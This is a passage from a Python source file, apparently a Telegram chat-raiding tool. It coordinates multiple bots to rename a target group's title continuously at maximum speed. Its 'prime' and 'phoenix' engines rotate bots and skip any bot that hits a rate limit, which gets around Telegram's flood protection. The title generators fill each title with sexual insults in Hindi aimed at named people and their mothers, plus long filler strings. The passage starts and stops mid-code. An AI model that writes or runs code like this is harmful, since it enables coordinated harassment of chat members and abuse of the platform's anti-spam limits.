            if flooded_until[idx] > now:
                rem = flooded_until[idx] - now
                if await _wait_ev(stop_event, min(rem, 0.25)):
                    return
                continue

            # Wait until scheduled send slot
            wait = next_send - time.monotonic()
            if wait > 0.005:
                if await _wait_ev(stop_event, wait):
                    return
                if stop_event.is_set():
                    return

            # Pre-generate title during wait window, fire immediately at slot
            title = name_factory()[:255]
            try:
                await bot.set_chat_title(chat_id, title)
                next_send += CYCLE                 # ← absolute: no drift ever
            except RetryAfter as e:
                pause = float(e.retry_after) + 0.4
                flooded_until[idx] = time.monotonic() + pause
                next_send = flooded_until[idx] + idx * STEP
            except (BadRequest, Forbidden):
                next_send += CYCLE * 2
            except (TimedOut, NetworkError):
                next_send = time.monotonic() + 1.2
            except asyncio.CancelledError:
                return
            except Exception:
                next_send += CYCLE

    tasks = [asyncio.create_task(_worker(i)) for i in range(N)]
    try:
        await stop_event.wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


async def _prime_engine(chat_id, bots, stop_event, factory, step: float):
    """
    PRIME ENGINE — Zero-flood, zero-jitter, max-speed coordinator.

    Design:
    • Single central ticker fires every `step` seconds (no parallel burst).
    • Round-robin across all bots — each tick picks the next available bot.
    • On RetryAfter → mark that bot flooded, skip to next bot on same tick,
      keep ticking at exact `step` interval.
    • On all-bots-flooded → pause until earliest bot recovers (no spin).
    • Absolute tick scheduling: next_tick += step (no drift ever).

    vs parallel workers: those all send simultaneously → burst → flood.
    Prime sends exactly ONE message per step → Telegram never sees a burst.
    """
    N = len(bots)
    if N == 0:
        return

    flooded_until = [0.0] * N   # per-bot flood expiry (monotonic)
    cursor        = [0]          # round-robin position
    next_tick     = time.monotonic()

    while not stop_event.is_set():
        # ── Wait for next absolute tick ──────────────────────────────────────
        wait = next_tick - time.monotonic()
        if wait > 0.001:
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=wait)
                return
            except asyncio.TimeoutError:
                pass
        if stop_event.is_set():
            return

        now = time.monotonic()

        # ── Pick next non-flooded bot (round-robin) ──────────────────────────
        chosen = -1
        for _ in range(N):
            i = cursor[0] % N
            cursor[0] += 1
            if flooded_until[i] <= now:
                chosen = i
                break

        if chosen == -1:
            # All bots flooded — wait until the soonest one recovers
            soonest_wait = min(flooded_until) - now
            if await _wait_ev(stop_event, max(soonest_wait, 0.05)):
                return
            continue  # re-check without advancing tick

        # ── Send ─────────────────────────────────────────────────────────────
        try:
            await bots[chosen].set_chat_title(chat_id, factory()[:255])
            next_tick += step                        # absolute — zero drift
        except RetryAfter as e:
            # Cap flood wait at 2.5s — bot recovers fast, tick keeps moving
            pause = min(float(e.retry_after) + 0.15, 2.5)
            flooded_until[chosen] = time.monotonic() + pause
            next_tick += step
        except (BadRequest, Forbidden):
            next_tick += step * 2
        except (TimedOut, NetworkError):
            next_tick = time.monotonic() + 0.5
        except asyncio.CancelledError:
            return
        except Exception:
            next_tick += step


async def _phoenix_engine(chat_id, bots, stop_event, factory, step: float):
    """
    PHOENIX ENGINE — Zero-flood, zero-jitter, maximum safe speed.
    Strictly better than GOD engine (god) in both speed stability and flood prevention.

    Design:
    • Hard safe floor: effective step is always max(step, 0.26s) — flood is physically impossible.
    • Single sequential ticker — ONE send per step, no parallel burst ever.
    • Round-robin across all bots — equal workload, no hot-bot.
    • Per-bot independent flood state — one bot flooded → skip it, others keep firing.
    • On RetryAfter → mark that bot cooldown, tick KEEPS MOVING at safe rate (no slow-down).
    • On all-bots-flooded → pause until earliest bot recovers, then resume (no spin).
    • Absolute tick scheduling: next_tick += SAFE_STEP → zero drift, zero jitter.

    vs GOD engine (god): GOD uses adaptive slowdown (can drift 0.18→0.32s); PHOENIX uses
    a fixed safe rate and per-bot skipping instead — faster and more consistent.
    vs PRIME engine: same architecture, but PHOENIX enforces the 0.26s floor regardless
    of what step value is passed (protects against low global -setdelay overrides).
    """
    N = len(bots)
    if N == 0:
        return

    SAFE_STEP     = max(step, 0.26)   # hard floor — Telegram safe at ≤3.8 sends/sec
    MAX_BOT_FLOOD = 2.5               # cap per-bot flood pause at 2.5s
    flooded_until = [0.0] * N
    cursor        = [0]
    next_tick     = time.monotonic()

    while not stop_event.is_set():
        # ── Wait for next absolute tick ──────────────────────────────────────
        wait = next_tick - time.monotonic()
        if wait > 0.001:
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=wait)
                return
            except asyncio.TimeoutError:
                pass
        if stop_event.is_set():
            return

        now = time.monotonic()

        # ── Pick next non-flooded bot (round-robin) ──────────────────────────
        chosen = -1
        for _ in range(N):
            i = cursor[0] % N
            cursor[0] += 1
            if flooded_until[i] <= now:
                chosen = i
                break

        if chosen == -1:
            # All bots flooded — wait until soonest one recovers (no busy-spin)
            soonest = min(flooded_until) - now
            if await _wait_ev(stop_event, max(soonest, 0.05)):
                return
            continue   # re-check without advancing tick

        # ── Send ─────────────────────────────────────────────────────────────
        try:
            await bots[chosen].set_chat_title(chat_id, factory()[:255])
            next_tick += SAFE_STEP                   # absolute — zero drift
        except RetryAfter as e:
            # Mark only THIS bot flooded; tick keeps moving so other bots cover
            pause = min(float(e.retry_after) + 0.10, MAX_BOT_FLOOD)
            flooded_until[chosen] = time.monotonic() + pause
            next_tick += SAFE_STEP                   # do NOT pause the ticker
        except (BadRequest, Forbidden):
            next_tick += SAFE_STEP * 2
        except (TimedOut, NetworkError):
            next_tick = time.monotonic() + 0.5
        except asyncio.CancelledError:
            return
        except Exception:
            next_tick += SAFE_STEP


def _last() -> list:
    return [None]

def _wrap_factory(txt: str, last=None) -> callable:
    if last is None:
        last = _last()
    def _f():
        wl = random.choice(WRAP_L)
        wr = random.choice(WRAP_R)
        sf = rnd_suffix()
        c  = f"{wl}{txt}{wr}{sf}"[:255]
        if c == last[0]:
            c = f"{wl}{txt}{wr}{rnd_suffix()}"[:255]
        last[0] = c
        return c
    return _f

def _friend_nc_factory(friend: str, cmd_txt: str) -> callable:
    uni  = FRIENDS_UNI.get(friend, _to_bold_italic(friend))
    last = _last()
    _TMPL = [
        lambda t, u, e: f"{t} 𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰 𓂃{e}་༘",
        lambda t, u, e: f"{t} 𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰 ✦{e}༘",
        lambda t, u, e: f"{t} 𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰 {e}་༘",
        lambda t, u, e: f"{t} 𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰 𓂃 {e}",
    ]
    _ri = [0]
    def _f():
        e    = rnd_emoji()
        tmpl = _TMPL[_ri[0] % len(_TMPL)]
        _ri[0] += 1
        c = tmpl(cmd_txt, uni, e)[:255]
        if c == last[0]:
            _ri[0] += 1
            c = _TMPL[_ri[0] % len(_TMPL)](cmd_txt, uni, rnd_emoji())[:255]
        last[0] = c
        return c
    return _f

def _build_rcod_lines():
    lines = []
    for f in FRIENDS:
        u = FRIENDS_UNI.get(f, _to_bold_italic(f))
        lines.append(f"𝑲𝑰 𝑴𝑨𝑨 {u} 𝑺𝑬 𝑪𝑼𝑫𝑰")
    lines.append("𝑲𝑰 𝑴𝑨𝑨 𝑷𝑼𝑹𝑬 𝑹𝑨𝑵𝑫𝑶𝑴 𝑺𝑬 𝑪𝑼𝑫𝑰")
    return lines

_RCOD_LINES = _build_rcod_lines()

def _randomcod_factory(txt: str) -> callable:
    last = _last()
    idx  = [0]
    def _f():
        line = _RCOD_LINES[idx[0] % len(_RCOD_LINES)]
        idx[0] += 1
        e = rnd_emoji()
        c = f"{txt} {line} ➪ 𓂃{e}་༘"[:255]
        if c == last[0]:
            c = f"{txt} {line} ➪ ✦{rnd_emoji()}༘"[:255]
        last[0] = c
        return c
    return _f

def _lean_nc_factory(txt: str) -> callable:
    _sfx = [
        " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫·", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫•", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫.", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫⁺", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫⁻", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫˙",
        " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ˢ", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ᵒ", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ᵃ", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ˣ", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ⁿ", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ᵗ", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫ᵉ",
        " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫.·", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫··", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫•·", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫·•", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫..", "  𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫·",
        " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫⌁", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫∘", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫∙", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫⋅", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫◦", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫 𒐫𒐫𒐫🍌𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🧃𒐫𒐫𒐫🍌𒐫𒐫∵", " 𝐋ᴜɴᴅ 𝐏ʀ 𝐔ᴄʜʜʟ 